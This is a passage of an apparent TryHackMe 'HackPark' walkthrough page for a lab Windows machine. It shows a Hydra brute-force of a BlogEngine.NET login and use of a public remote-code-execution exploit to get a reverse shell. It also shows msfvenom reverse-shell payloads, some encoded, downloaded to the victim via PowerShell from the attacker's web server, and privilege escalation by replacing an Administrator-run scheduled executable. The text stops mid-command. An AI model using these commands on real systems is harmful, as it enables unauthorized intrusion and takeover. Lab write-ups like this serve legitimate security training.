@@ -1,0 +1,243 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel=preload as=font href=https://www.xuptox.org/fonts/vendor/jost/jost-v4-latin-regular.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=https://www.xuptox.org/fonts/vendor/jost/jost-v4-latin-700.woff2 type=font/woff2 crossorigin><link rel=stylesheet href=https://www.xuptox.org/main.a5fd6679921f2ded0790acb9802ae6b8d6bbb7c4fe95b6110da0ced601d762ddee999cbd27ee98d26e9ceaa9d08d4825d8f26a36d629a2ff8a67e8fc6a6d234f.css integrity="sha512-pf1meZIfLe0HkKy5gCrmuNa7t8T+lbYRDaDO1gHXYt3umZy9J+6Y0m6c6qnQjUgl2PJqNtYpov+KZ+j8am0jTw==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><meta name=robots content="index, follow"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><title>HackPark - Xuptox</title><meta name=description content="Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!"><link rel=canonical href=https://www.xuptox.org/docs/tryhackme/hackpark/><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/docs/tryhackme/hackpark/thm_hackpark_welcome.jpg"><meta name=twitter:title content="HackPark"><meta name=twitter:description content="Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!"><meta name=twitter:site content="@"><meta name=twitter:creator content="@"><meta property="og:title" content="HackPark"><meta property="og:description" content="Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!"><meta property="og:type" content="article"><meta property="og:url" content="/docs/tryhackme/hackpark/"><meta property="og:image" content="/docs/tryhackme/hackpark/thm_hackpark_welcome.jpg"><meta property="article:published_time" content="2021-04-14T23:00:14+02:00"><meta property="article:modified_time" content="2021-04-14T23:00:14+02:00"><meta property="og:site_name" content="Xuptox"><meta property="article:publisher" content="https://www.facebook.com/"><meta property="article:author" content="https://www.facebook.com/"><meta property="og:locale" content="en_US"><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/www.xuptox.org"},{"@type":"ListItem","position":3,"name":"Docs","item":"https:\/\/www.xuptox.org\/docs\/"},{"@type":"ListItem","position":4,"name":"Tryhackme","item":"https:\/\/www.xuptox.org\/docs\/tryhackme\/"},{"@type":"ListItem","position":5,"name":"Hackpark","item":"https:\/\/www.xuptox.org\/docs\/tryhackme\/hackpark\/"}]}</script><meta name=theme-color content="#fff"><link rel=apple-touch-icon sizes=180x180 href=https://www.xuptox.org/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://www.xuptox.org/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://www.xuptox.org/favicon-16x16.png><link rel=manifest href=https://www.xuptox.org/site.webmanifest></head><body class="docs single"><div class="header-bar fixed-top"></div><header class="navbar fixed-top navbar-expand-md navbar-light"><div class=container><input class="menu-btn order-0" type=checkbox id=menu-btn>
+<label class="menu-icon d-md-none" for=menu-btn><span class=navicon></span></label><a class="navbar-brand order-1 order-md-0 me-auto" href=https://www.xuptox.org/>Xuptox</a>
+<button id=mode class="btn btn-link order-2 order-md-4" type=button aria-label="Toggle mode">
+<span class=toggle-dark><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg></span><span class=toggle-light><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></span></button><ul class="navbar-nav social-nav order-3 order-md-5"></ul><div class="collapse navbar-collapse order-4 order-md-1"><ul class="navbar-nav main-nav me-auto order-5 order-md-2"><li class=nav-item><a class=nav-link href=https://www.xuptox.org/docs/tryhackme/>TryHackMe</a></li></ul><div class="break order-6 d-md-none"></div><form class="navbar-form flex-grow-1 order-7 order-md-3"><input id=userinput class="form-control is-search" type=search placeholder="Search docs..." aria-label="Search docs..." autocomplete=off><div id=suggestions class="shadow bg-white rounded"></div></form></div></div></header><div class="wrap container" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-md-3 col-lg-3 col-xl-3 docs-sidebar"><nav class=docs-links aria-label="Main navigation"><h3>TryHackMe</h3><ul class=list-unstyled><li><a class=docs-link href=https://www.xuptox.org/docs/tryhackme/gamezone/>GameZone</a></li><li><a class=docs-link href=https://www.xuptox.org/docs/tryhackme/hackpark/>HackPark</a></li></ul></nav></div><nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=TableOfContents><ul><li><a href=#used-commands>Used Commands</a></li><li><a href=#task-1>Task 1</a><ul><li><a href=#google-brwhos-the-clown>Google:<br>Who&rsquo;s the clown?</a></li></ul></li><li><a href=#task-2>Task 2</a><ul><li><a href=#hydra-brbrute-forcing-a-password>Hydra:<br>Brute-forcing a password</a></li><li><a href=#burp-suite-br-brute-forcing-a-password>Burp-Suite:<br>Brute-forcing a password</a></li><li><a href=#burp-suite-brrequest-type-of-login-form>Burp-Suite:<br>Request type of login form</a></li></ul></li><li><a href=#task-3>Task 3</a><ul><li><a href=#searchsploit-find-exploits>SearchSploit: Find exploits</a></li><li><a href=#gain-a-reverse-shell>Gain a reverse shell</a></li></ul></li><li><a href=#task-4-metasploit>Task 4 (Metasploit)</a><ul><li><a href=#compromise-the-machine>Compromise the machine</a></li><li><a href=#whats-the-os-version>What&rsquo;s the OS version?</a></li><li><a href=#winpeasbrenumeration>WinPEAS:<br>Enumeration</a></li><li><a href=#any-suspicious-service-running>Any suspicious service running?</a></li><li><a href=#root-the-machine>Root the machine</a></li></ul></li><li><a href=#task-5-wo-metasploit>Task 5 (w/o Metasploit)</a><ul><li><a href=#compromise-the-machine-1>Compromise the machine</a></li><li><a href=#root-the-machine-1>Root the machine</a></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-13 col-xl-10"><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=https://www.xuptox.org/>Home</a></li><li class=breadcrumb-item><a href=https://www.xuptox.org/docs/>WriteUps</a></li><li class=breadcrumb-item><a href=https://www.xuptox.org/docs/tryhackme/>Try Hack Me</a></li><li class="breadcrumb-item active" aria-current=page>HackPark</li></ol></nav><h1>HackPark</h1><p class=lead>Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!</p><br><a><kbd class="item-tag windows">windows</kbd></a>
+<a><kbd class="item-tag CVE 20196714">CVE 20196714</kbd></a>
+<a><kbd class="item-tag RCE">RCE</kbd></a>
+<a><kbd class="item-tag winPEAS">winPEAS</kbd></a>
+<a><kbd class="item-tag Hydra">Hydra</kbd></a>
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_hackpark_welcome_hu191d490dff3878ccdee82eecf547ca19_186320_20x0_resize_q75_box.jpg data-src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_hackpark_welcome.jpg width=976 height=918 alt="Welcome screen"><h2 id=used-commands>Used Commands<a href=#used-commands class=anchor aria-hidden=true>#</a></h2><pre><code class=language-sh>hydra -l &lt;username&gt; -P &lt;path to wordlist&gt; &lt;target ip&gt; http-post-form &lt;payload&gt;
+searchsploit &lt;search name&gt;
+nc -lvnp &lt;listener port&gt;
+python3 -m http.server &lt;webserver port&gt;
+
+msfvenom --list payloads
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;listener ip&gt; LPORT=&lt;listener port&gt; -f exe &gt; shell.exe
+msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=&lt;listener ip&gt; LPORT=&lt;listener port&gt; -f exe -o &lt;output filename&gt;
+msfvenom -p &lt;payload&gt; -a &lt;architecture&gt; --encoder /x86/shikata_ga_nai LHOST=&lt;listener ip&gt; LPORT=&lt;listener port&gt; -f exe -o &lt;output filename&gt;
+</code></pre><pre><code class=language-powershell>getuid
+powershell -c &quot;Invoke-WebRequest -Uri 'http://&lt;webserver ip&gt;:&lt;webserver port&gt;/&lt;filename&gt;' -OutFile '&lt;output filename&gt;'&quot;
+powershell &quot;(New-Object System.Net.WebClient).Downloadfile('http://&lt;webserver ip&gt;:&lt;webserver port&gt;/&lt;filename&gt;','&lt;output filename')&quot;
+ren &lt;filename&gt; &lt;new filename&gt;
+</code></pre><h2 id=task-1>Task 1<a href=#task-1 class=anchor aria-hidden=true>#</a></h2><h3 id=google-brwhos-the-clown>Google:<br>Who&rsquo;s the clown?<a href=#google-brwhos-the-clown class=anchor aria-hidden=true>#</a></h3><p>A quick search on the source of code didn&rsquo;t give me any hints.<br>So I searched on google and finally found the name.<br><div class="alert alert-warning d-flex" role=alert><div class="flex-shrink-1 alert-icon">💡</div><div class=w-100>Hint: For me it was not the first result</div></div></p><h2 id=task-2>Task 2<a href=#task-2 class=anchor aria-hidden=true>#</a></h2><p>Find the login page in the menu.
+This gives us some more knowledge about the used components.</p><h3 id=hydra-brbrute-forcing-a-password>Hydra:<br>Brute-forcing a password<a href=#hydra-brbrute-forcing-a-password class=anchor aria-hidden=true>#</a></h3><p>Before I started using Hydra I did a quick search on google and tried to find some default credentials.</p><table><thead><tr><th>Username</th><th>Password</th></tr></thead><tbody><tr><td>admin</td><td>admin</td></tr><tr><td>admin</td><td>Passw@rd123</td></tr></tbody></table><p>Unfortunately this didn&rsquo;t work out so let&rsquo;s continue with Hydra.</p><pre><code class=language-sh>hydra -l admin -P /usr/share/wordlists/rockyou.txt &lt;target ip&gt; http-post-form &lt;payload&gt;
+</code></pre><table><thead><tr><th>Parameter</th><th>Description</th></tr></thead><tbody><tr><td>-l</td><td>&lt;username></td></tr><tr><td>-P</td><td>&lt;wordslist></td></tr><tr><td>&lt;payload></td><td>everything starting<br>from <code>__VIEWSTATE=...</code><br>to <code>...LoginButton=Log+in</code><br>check the following screenshot</td></tr></tbody></table><p>If everything worked you should receive something like this</p><pre><code class=language-sh>[80][http-post-form] host: 10.10.9.86   login: admin   password: 1qaxxxxx
+1 of 1 target successfully completed, 1 valid password found
+</code></pre><h3 id=burp-suite-br-brute-forcing-a-password>Burp-Suite:<br>Brute-forcing a password<a href=#burp-suite-br-brute-forcing-a-password class=anchor aria-hidden=true>#</a></h3><p>Burp-Suites Intruder is another option guessing passwords.
+The Source code of the login page shows that this login seems to be for an administrator.
+So I decided to start out with &ldquo;admin&rdquo; as username and any password wordlist you can find.</p><p>You should give it a try.</p><h3 id=burp-suite-brrequest-type-of-login-form>Burp-Suite:<br>Request type of login form<a href=#burp-suite-brrequest-type-of-login-form class=anchor aria-hidden=true>#</a></h3><p>Checkout the source code of the webpage or if you used Burp Suite check the request when you try to login with any credentials.</p><h2 id=task-3>Task 3<a href=#task-3 class=anchor aria-hidden=true>#</a></h2><p>Check out the about page from the sidebar to find the current version of BlogEngine</p><h3 id=searchsploit-find-exploits>SearchSploit: Find exploits<a href=#searchsploit-find-exploits class=anchor aria-hidden=true>#</a></h3><p>What is the CVE Version?
+You will get multiple reports when you search for BlogEngine.NET.</p><pre><code class=language-sh>searchsploit BlogEngine.NET
+</code></pre><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_hackpark_searchsploit_result_huf069f124cedceadb21d6244e496177fe_22383_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_hackpark_searchsploit_result.png width=811 height=233 alt="Result of search with searchsploit"><p>3 of them are regarding remote code execution (that&rsquo;s what we are striving for) but only 1 of them is valid. Go and find the right one or try them all.</p><h3 id=gain-a-reverse-shell>Gain a reverse shell<a href=#gain-a-reverse-shell class=anchor aria-hidden=true>#</a></h3><p>Copy the file to your working directory.
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_searchsploit_download_hu591380107dade826969b413f3849d5e0_9357_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_searchsploit_download.png width=631 height=123 alt="Copy exploit file to working directory"></p><p>Before we answer the next question we need to gain access to the server.
+Let&rsquo;s run that exploit</p><div class="alert alert-warning d-flex" role=alert><div class="flex-shrink-1 alert-icon">📌</div><div class=w-100>Read the description of the exploit and follow the instructions<br>you will find everything you need to know in the file header</div></div><pre><code class=language-sh>vim 46353.cs
+</code></pre><ul><li><p>Change the <code>&lt;listener ip></code> and <code>&lt;listener port></code>
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_exploit_step_1_hu834e4985a007f26c8c8c736b0a590272_19525_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_exploit_step_1.png width=905 height=262 alt="Changes on exploit file: IP and Port"></p></li><li><p>Setup a netcat listener on that port <code>nc -lvnp &lt;listener port></code></p></li><li><p>Rename exploit file to <code>PostView.ascx</code></p></li><li><p>Upload the file on the target server by editing a post (read the description)<br><code>http://&lt;target ip>/admin/app/editor/editpost.cshtml</code>
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_exploit_step_2_huad672dfe8e42fa794d7963474e7f75aa_23855_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_exploit_step_2.png width=697 height=427 alt="Screenshot of the icon to use to upload a file">
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_exploit_step_3_hud6116d5eee87cb72177c4cd184fc1c71_16430_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_exploit_step_3.png width=697 height=427 alt="Confirmation the file was uploaded"></p></li><li><p>Use the browser to access the base URL like so:<br><code>http://&lt;target ip>/?theme=../../App_Data/files</code></p></li></ul><p><code>whoami</code> will answer the next question<br>Who is the webserver running as?</p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_exploit_step_4_huc90c99eb7a3268c56ae1d08386ee75ef_34331_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_exploit_step_4.png width=490 height=150 alt="Established reverse shell with running whoami: iis apppool\blog"><h2 id=task-4-metasploit>Task 4 (Metasploit)<a href=#task-4-metasploit class=anchor aria-hidden=true>#</a></h2><h3 id=compromise-the-machine>Compromise the machine<a href=#compromise-the-machine class=anchor aria-hidden=true>#</a></h3><p>Let&rsquo;s create a better shell using msfvenom.</p><pre><code class=language-sh>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;listener ip&gt; LPORT=9001 -f exe &gt; shell.exe
+</code></pre><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_t4_shell_exe_hu9c875d8d6a0f7b018006a748da85b561_17936_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_t4_shell_exe.png width=895 height=140 alt="Creation of reverse shell executable with msfvenom"><p>Setup a http.server on the attacker machine. I used <code>python3</code> and <code>http.server</code> for this.</p><pre><code class=language-sh>python3 -m http.server 8000
+</code></pre><div class="alert alert-warning d-flex" role=alert><div class="flex-shrink-1 alert-icon">💡</div><div class=w-100>Keep in mind that the webserver was started on the same folder where the prepared exploit is saved to.</div></div><p>Use the existing reverse shell and download the <code>shell.exe</code> on the victim machine using powershell.</p><pre><code class=language-sh>powershell &quot;(New-Object System.Net.WebClient).Downloadfile('http://&lt;webserver ip&gt;:8000/shell.exe','shell.exe')&quot;
+</code></pre><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_t4_upload_shell_exe_huc78d2798b661d7e14d6f20e7d33ea12b_7502_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_t4_upload_shell_exe.png width=571 height=71 alt="python3 webserver on port 8000"><p>Before executing <code>shell.exe</code> let&rsquo;s start Metasploit and setup a meterpreter/reverse_shell_tcp</p><pre><code class=language-sh>msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+</code></pre><p>Check <code>options</code> and set the required parameters.</p><div class="alert alert-warning d-flex" role=alert><div class="flex-shrink-1 alert-icon">📌</div><div class=w-100>LPORT must match with the used port when we created shell.exe. I used 9001!</div></div><pre><code class=language-sh>set LHOST &lt;atk ip&gt;
+set LPORT 9001
+run
+</code></pre><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_t4_multi_handler_hu8f993e90840028cd47d1c2e7474eec5a_27799_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_t4_multi_handler.png width=782 height=535 alt="Options on metasploit multi/handler with meterpreter/reverse_tcp payload"><p>Use <code>run</code> to start the listener. If everything is correct you should now see a message like this:</p><pre><code class=language-sh>[*] Started reverse TCP handler on 10.10.219.52:9001
+</code></pre><p>Run <code>shell.exe</code> on the victim machine</p><pre><code class=language-sh>shell.exe
+</code></pre><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_t4_multi_handler_get_session_huea2f5d1c3823fe1f6f89f805f863c323_8214_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_t4_multi_handler_get_session.png width=848 height=104 alt="Incoming connection from target"><h3 id=whats-the-os-version>What&rsquo;s the OS version?<a href=#whats-the-os-version class=anchor aria-hidden=true>#</a></h3><p>As soon as you are connected with the new meterpreter shell, run <code>sysinfo</code> to get the OS version.
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_t4_os_version_hu46a5f1e6e37711461c5dc51c8d885ebc_15656_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_t4_os_version.png width=417 height=153 alt="Printed sysinfo"></p><h3 id=winpeasbrenumeration>WinPEAS:<br>Enumeration<a href=#winpeasbrenumeration class=anchor aria-hidden=true>#</a></h3><div class="alert alert-warning d-flex" role=alert><div class="flex-shrink-1 alert-icon">💡</div><div class=w-100>Instead of windows-exploit-suggester I used winPEAS</div></div><p>If you do not have WinPEAS already stored on your machine, you can do this now. A quick search on google will give you all the information you need.</p><p>Use the same method as used in the last step to get winPEAS.bat transferred to the target machine.</p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_t4_upload_winPEAS_1_hu57702decde20fcd868586fdee2709831_7874_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_t4_upload_winPEAS_1.png width=440 height=150 alt="Switch to meterpreter shell"><pre><code class=language-sh>powershell &quot;(New-Object System.Net.WebClient).Downloadfile('http://&lt;webserver ip&gt;:8000/winPEAS.bat','winPEAS.bat')&quot;
+</code></pre><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_t4_upload_winPEAS_2_hu496d72db57f7230794731c125518c84a_46960_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/hackpark/thm_t4_upload_winPEAS_2.png width=895 height=536 alt="List of files in temp folder"><p>Run <code>winPEAS.bat</code></p><h3 id=any-suspicious-service-running>Any suspicious service running?<a href=#any-suspicious-service-running class=anchor aria-hidden=true>#</a></h3><p>Have a look at the output of winPEAS (<code>RUNNING PROCESSES</code> is what we are searching for)</p><div class="alert alert-warning d-flex" role=alert><div class="flex-shrink-1 alert-icon">💡</div><div class=w-100>It's always worth checking for WindowsScheduler or CronTabs on Linux</div></div><pre><code class=language-sh>_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-&gt; [+] RUNNING PROCESSES &lt;_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Something unexpected is running? Check for vulnerabilities
+ [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes
+
+Image Name                     PID Services
+========================= ======== ============================================
+System Idle Process              0 N/A
+System                           4 N/A
+smss.exe                       376 N/A
+csrss.exe                      524 N/A
+csrss.exe                      580 N/A
+wininit.exe                    588 N/A
+winlogon.exe                   616 N/A
+services.exe                   680 N/A
+lsass.exe                      688 SamSs
+svchost.exe                    748 BrokerInfrastructure, DcomLaunch, LSM,
+                                   PlugPlay, Power, SystemEventsBroker
+svchost.exe                    792 RpcEptMapper, RpcSs
+dwm.exe                        872 N/A
+svchost.exe                    888 Dhcp, EventLog, lmhosts, Wcmsvc
+svchost.exe                    916 AeLookupSvc, CertPropSvc, DsmSvc, gpsvc,
+                                   iphlpsvc, LanmanServer, ProfSvc, Schedule,
+                                   SENS, SessionEnv, ShellHWDetection, Themes,
+                                   Winmgmt
+svchost.exe                    972 EventSystem, FontCache, netprofm, nsi,
+                                   W32Time, WinHttpAutoProxySvc
+svchost.exe                    360 CryptSvc, Dnscache, LanmanWorkstation,
+                                   NlaSvc, WinRM
+svchost.exe                    848 BFE, DPS, MpsSvc
+spoolsv.exe                   1148 Spooler
+amazon-ssm-agent.exe          1180 AmazonSSMAgent
+svchost.exe                   1256 AppHostSvc
+LiteAgent.exe                 1276 AWSLiteAgent
+svchost.exe                   1372 TrkWks, UALSVC, UmRdpService
+svchost.exe                   1388 W3SVC, WAS
+WService.exe                  1416 WindowsScheduler
+WScheduler.exe                1556 N/A
+Ec2Config.exe                 1656 Ec2Config
+WmiPrvSE.exe                  1748 N/A
+svchost.exe                   1432 TermService
+taskhostex.exe                2584 N/A
+explorer.exe                  2656 N/A
+ServerManager.exe             2360 N/A
+WScheduler.exe                1804 N/A
+msdtc.exe                     1888 MSDTC
+w3wp.exe                      2520 N/A
+cmd.exe                       1564 N/A
+conhost.exe                   2116 N/A
+shell.exe                     1860 N/A
+cmd.exe                       2132 N/A
+conhost.exe                    924 N/A
+WmiPrvSE.exe                  1864 N/A
+TrustedInstaller.exe          1948 TrustedInstaller
+TiWorker.exe                  1356 N/A
+tasklist.exe                  2668 N/A
+</code></pre><p>Head over to the <code>SystemScheduler</code> folder.</p><div class="alert alert-warning d-flex" role=alert><div class="flex-shrink-1 alert-icon">💡</div><div class=w-100>I sent the current channel to background with `ctrl + z`</div></div><pre><code class=language-sh>cd &quot;c:\Program Files (x86)\SystemScheduler&quot;
+</code></pre><p>Check out the read, write, execute permissions! That looks great!</p><pre><code class=language-sh>meterpreter &gt; ls
+Listing: c:\Program Files (x86)\SystemScheduler
+===============================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+40777/rwxrwxrwx   4096     dir   2019-08-04 11:36:53 +0000  Events
+100666/rw-rw-rw-  60       fil   2019-08-04 11:36:42 +0000  Forum.url
+100666/rw-rw-rw-  9813     fil   2019-08-04 11:36:42 +0000  License.txt
+100666/rw-rw-rw-  1496     fil   2019-08-04 11:37:02 +0000  LogFile.txt
+100666/rw-rw-rw-  3760     fil   2019-08-04 11:36:53 +0000  LogfileAdvanced.txt
+100777/rwxrwxrwx  536992   fil   2019-08-04 11:36:42 +0000  Message.exe
+100777/rwxrwxrwx  445344   fil   2019-08-04 11:36:42 +0000  PlaySound.exe
+100777/rwxrwxrwx  27040    fil   2019-08-04 11:36:42 +0000  PlayWAV.exe
+100666/rw-rw-rw-  149      fil   2019-08-04 11:36:53 +0000  Preferences.ini
+100777/rwxrwxrwx  485792   fil   2019-08-04 11:36:42 +0000  Privilege.exe
+100666/rw-rw-rw-  10100    fil   2019-08-04 11:36:42 +0000  ReadMe.txt
+100777/rwxrwxrwx  112544   fil   2019-08-04 11:36:42 +0000  RunNow.exe
+100777/rwxrwxrwx  235936   fil   2019-08-04 11:36:42 +0000  SSAdmin.exe
+100777/rwxrwxrwx  731552   fil   2019-08-04 11:36:42 +0000  SSCmd.exe
+100777/rwxrwxrwx  456608   fil   2019-08-04 11:36:42 +0000  SSMail.exe
+100777/rwxrwxrwx  1633696  fil   2019-08-04 11:36:42 +0000  Scheduler.exe
+100777/rwxrwxrwx  491936   fil   2019-08-04 11:36:42 +0000  SendKeysHelper.exe
+100777/rwxrwxrwx  437664   fil   2019-08-04 11:36:42 +0000  ShowXY.exe
+100777/rwxrwxrwx  439712   fil   2019-08-04 11:36:42 +0000  ShutdownGUI.exe
+100666/rw-rw-rw-  785042   fil   2019-08-04 11:36:42 +0000  WSCHEDULER.CHM
+100666/rw-rw-rw-  703081   fil   2019-08-04 11:36:42 +0000  WSCHEDULER.HLP
+100777/rwxrwxrwx  136096   fil   2019-08-04 11:36:42 +0000  WSCtrl.exe
+100777/rwxrwxrwx  68512    fil   2019-08-04 11:36:42 +0000  WSLogon.exe
+100666/rw-rw-rw-  33184    fil   2019-08-04 11:36:42 +0000  WSProc.dll
+100666/rw-rw-rw-  2026     fil   2019-08-04 11:36:42 +0000  WScheduler.cnt
+100777/rwxrwxrwx  331168   fil   2019-08-04 11:36:42 +0000  WScheduler.exe
+100777/rwxrwxrwx  98720    fil   2019-08-04 11:36:42 +0000  WService.exe
+100666/rw-rw-rw-  54       fil   2019-08-04 11:36:42 +0000  Website.url
+100777/rwxrwxrwx  76704    fil   2019-08-04 11:36:42 +0000  WhoAmI.exe
+100666/rw-rw-rw-  1150     fil   2019-08-04 11:36:42 +0000  alarmclock.ico
+100666/rw-rw-rw-  766      fil   2019-08-04 11:36:42 +0000  clock.ico
+100666/rw-rw-rw-  80856    fil   2019-08-04 11:36:42 +0000  ding.wav
+100666/rw-rw-rw-  1637972  fil   2019-08-04 11:36:42 +0000  libeay32.dll
+100777/rwxrwxrwx  40352    fil   2019-08-04 11:36:42 +0000  sc32.exe
+100666/rw-rw-rw-  766      fil   2019-08-04 11:36:42 +0000  schedule.ico
+100666/rw-rw-rw-  355446   fil   2019-08-04 11:36:42 +0000  ssleay32.dll
+100666/rw-rw-rw-  6999     fil   2019-08-04 11:36:42 +0000  unins000.dat
+100777/rwxrwxrwx  722597   fil   2019-08-04 11:36:42 +0000  unins000.exe
+100666/rw-rw-rw-  6574     fil   2019-08-04 11:36:42 +0000  whiteclock.ico
+</code></pre><p>Let&rsquo;s dig deeper into <code>Events</code> folder and check some logfiles.</p><pre><code class=language-sh>meterpreter &gt; cd Events
+meterpreter &gt; ls
+Listing: c:\Program Files (x86)\SystemScheduler\Events
+======================================================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100666/rw-rw-rw-  1926   fil   2019-08-04 22:05:19 +0000  20198415519.INI
+100666/rw-rw-rw-  27140  fil   2019-08-04 22:06:01 +0000  20198415519.INI_LOG.txt
+100666/rw-rw-rw-  290    fil   2020-10-02 21:50:12 +0000  2020102145012.INI
+100666/rw-rw-rw-  186    fil   2021-04-18 10:02:05 +0000  Administrator.flg
+100666/rw-rw-rw-  182    fil   2021-04-18 10:01:36 +0000  SYSTEM_svc.flg
+100666/rw-rw-rw-  0      fil   2021-04-18 10:02:05 +0000  Scheduler.flg
+100666/rw-rw-rw-  449    fil   2019-08-04 11:36:53 +0000  SessionInfo.flg
+100666/rw-rw-rw-  0      fil   2021-04-18 10:01:36 +0000  service.flg
+</code></pre><p>While you check the log files you will find this:</p><pre><code class=language-sh>meterpreter &gt; cat 20198415519.INI_LOG.txt
+...
+04/18/21 04:13:34,Process Ended. PID:2376,ExitCode:4,Message.exe (Administrator)
+04/18/21 04:14:01,Event Started Ok, (Administrator)
+04/18/21 04:14:34,Process Ended. PID:2880,ExitCode:4,Message.exe (Administrator)
+04/18/21 04:15:01,Event Started Ok, (Administrator)
+04/18/21 04:15:33,Process Ended. PID:2604,ExitCode:4,Message.exe (Administrator)
+04/18/21 04:16:01,Event Started Ok, (Administrator)
+04/18/21 04:16:33,Process Ended. PID:2556,ExitCode:4,Message.exe (Administrator)
+04/18/21 04:17:00,Event Started Ok, (Administrator)
+04/18/21 04:17:34,Process Ended. PID:2400,ExitCode:4,Message.exe (Administrator)
+04/18/21 04:18:01,Event Started Ok, (Administrator)
+04/18/21 04:18:34,Process Ended. PID:2956,ExitCode:4,Message.exe (Administrator)
+04/18/21 04:19:01,Event Started Ok, (Administrator)
+meterpreter &gt;
+
+</code></pre><p>There is a service running every 30 seconds. Check the user. Great! Let&rsquo;s get root now.</p><h3 id=root-the-machine>Root the machine<a href=#root-the-machine class=anchor aria-hidden=true>#</a></h3><p>Replace Message.exe by our renamed shell.exe
+Use the python webserver setup earlier to download the shell into SystemScheduler folder.</p><pre><code class=language-sh>meterpreter &gt; shell
+Process 2628 created.
+Channel 8 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+c:\Program Files (x86)\SystemScheduler&gt;powershell -c &quot;Invoke-WebRequest -Uri 'http://&lt;webserver ip&gt;:8000/shell.exe' -OutFile 'c:\Program Files (x86)\SystemScheduler\shell.exe'&quot;
